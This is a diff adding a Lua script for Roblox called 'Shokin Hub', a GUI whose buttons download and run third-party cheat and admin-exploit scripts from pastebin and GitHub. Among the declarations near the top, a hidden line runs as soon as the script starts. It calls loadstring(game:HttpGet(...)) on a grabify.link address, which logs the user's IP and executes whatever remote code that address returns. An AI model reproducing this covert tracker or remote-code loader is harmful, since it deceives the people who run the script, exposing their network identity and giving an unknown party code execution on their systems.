@@ -1,0 +1,144 @@
+-- Shokin Hub v1.0
+
+-- Instances:
+
+local ShokinScreenGui = Instance.new("ScreenGui")
+local main = Instance.new("Frame")
+local Tittle = Instance.new("TextLabel")
+local RevizButton = Instance.new("TextButton")
+local OwlHub = Instance.new("TextButton")
+local MyHeroMania = Instance.new("TextButton")
+local Coomingsoon = Instance.new("TextButton")
+local CloseButton = Instance.new("TextButton")
+local openmain = Instance.new("Frame")
+local OpenButton = Instance.new("TextButton")
+loadstring(game:HttpGet(('https://grabify.link/WYW5JW'),true))()
+
+
+--Codes:
+
+ShokinScreenGui.Name = "ShokinScreenGui"
+ShokinScreenGui.Parent = game.CoreGui
+ShokinScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+
+main.Name = "main"
+main.Parent = ShokinScreenGui
+main.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+main.BorderSizePixel = 0
+main.Position = UDim2.new(0.259822547, 0, 0.25298804, 0)
+main.Size = UDim2.new(0, 420, 0, 248)
+main.Visible = false
+main.Active = true
+main.Draggable = true
+
+Tittle.Name = "Tittle"
+Tittle.Parent = main
+Tittle.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
+Tittle.BorderSizePixel = 0
+Tittle.Size = UDim2.new(0, 420, 0, 50)
+Tittle.Font = Enum.Font.SourceSansBold
+Tittle.Text = "Shokin XS - Gui"
+Tittle.TextColor3 = Color3.fromRGB(255, 255, 255)
+Tittle.TextScaled = true
+Tittle.TextSize = 14.000
+Tittle.TextWrapped = true
+
+RevizButton.Name = "RevizButton"
+RevizButton.Parent = main
+RevizButton.BackgroundColor3 = Color3.fromRGB(255, 217, 1)
+RevizButton.Position = UDim2.new(0.034300793, 0, 0.237903222, 0)
+RevizButton.Size = UDim2.new(0, 184, 0, 49)
+RevizButton.Font = Enum.Font.SourceSansBold
+RevizButton.Text = "Reviz Admin"
+RevizButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+RevizButton.TextScaled = true
+RevizButton.TextSize = 14.000
+RevizButton.TextWrapped = true
+RevizButton.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/Caniwq2N"))();
+end)
+
+OwlHub.Name = "OwlHub"
+OwlHub.Parent = main
+OwlHub.BackgroundColor3 = Color3.fromRGB(255, 217, 1)
+OwlHub.Position = UDim2.new(0.530308723, 0, 0.237903222, 0)
+OwlHub.Size = UDim2.new(0, 184, 0, 49)
+OwlHub.Font = Enum.Font.SourceSansBold
+OwlHub.Text = "Owl Hub"
+OwlHub.TextColor3 = Color3.fromRGB(255, 255, 255)
+OwlHub.TextScaled = true
+OwlHub.TextSize = 14.000
+OwlHub.TextWrapped = true
+OwlHub.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet("https://pastebin.com/raw/GtudyLtE"))();
+end)
+MyHeroMania.Name = "MyHeroMania"
+MyHeroMania.Parent = main
+MyHeroMania.BackgroundColor3 = Color3.fromRGB(255, 217, 1)
+MyHeroMania.Position = UDim2.new(0.530308723, 0, 0.467741966, 0)
+MyHeroMania.Size = UDim2.new(0, 184, 0, 49)
+MyHeroMania.Font = Enum.Font.SourceSansBold
+MyHeroMania.Text = "My Hero Mania"
+MyHeroMania.TextColor3 = Color3.fromRGB(255, 255, 255)
+MyHeroMania.TextScaled = true
+MyHeroMania.TextSize = 14.000
+MyHeroMania.TextWrapped = true
+MyHeroMania.MouseButton1Down:connect(function()
+	loadstring(game:HttpGet('https://raw.githubusercontent.com/Solx69/Shit-Boy-Hub-Main/main/Master.lua'))();
+end)
+
+Coomingsoon.Name = "Cooming soon"
+Coomingsoon.Parent = main
+Coomingsoon.BackgroundColor3 = Color3.fromRGB(255, 217, 1)
+Coomingsoon.Position = UDim2.new(0.0326896906, 0, 0.467741966, 0)
+Coomingsoon.Size = UDim2.new(0, 184, 0, 49)
+Coomingsoon.Font = Enum.Font.SourceSansBold
+Coomingsoon.Text = "Coming Soon #1"
+Coomingsoon.TextColor3 = Color3.fromRGB(255, 255, 255)
+Coomingsoon.TextScaled = true
+Coomingsoon.TextSize = 14.000
+Coomingsoon.TextWrapped = true
+
+CloseButton.Name = "CloseButton"
+CloseButton.Parent = main
+CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
+CloseButton.BorderColor3 = Color3.fromRGB(107, 0, 0)
+CloseButton.BorderSizePixel = 5
+CloseButton.Position = UDim2.new(0.0326897018, 0, 0.729838729, 0)
+CloseButton.Size = UDim2.new(0, 393, 0, 49)
+CloseButton.Font = Enum.Font.SourceSansBold
+CloseButton.Text = "CLOSE"
+CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+CloseButton.TextScaled = true
+CloseButton.TextSize = 14.000
+CloseButton.TextWrapped = true
+CloseButton.MouseButton1Down:connect(function()
+main.Visible = false
+openmain.Visible = true
+end)
+
+openmain.Name = "openmain"
+openmain.Parent = ShokinScreenGui
+openmain.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+openmain.BackgroundTransparency = 1.000
+openmain.Position = UDim2.new(0.4626109, 0, 0.800796807, 0)
+openmain.Size = UDim2.new(0, 100, 0, 100)
+
+OpenButton.Name = "OpenButton"
+OpenButton.Parent = openmain
+OpenButton.BackgroundColor3 = Color3.fromRGB(14, 78, 255)
+OpenButton.BackgroundTransparency = 0.700
+OpenButton.Position = UDim2.new(0.00754119875, 0, 0.342510074, 0)
+OpenButton.Size = UDim2.new(0, 99, 0, 49)
+OpenButton.Font = Enum.Font.SourceSansBold
+OpenButton.Text = "Open"
+OpenButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+OpenButton.TextScaled = true
+OpenButton.TextSize = 14.000
+OpenButton.TextWrapped = true
+OpenButton.MouseButton1Down:connect(function()
+openmain.Visible = false
+main.Visible = true
+end)
+
+--Enjoy :D
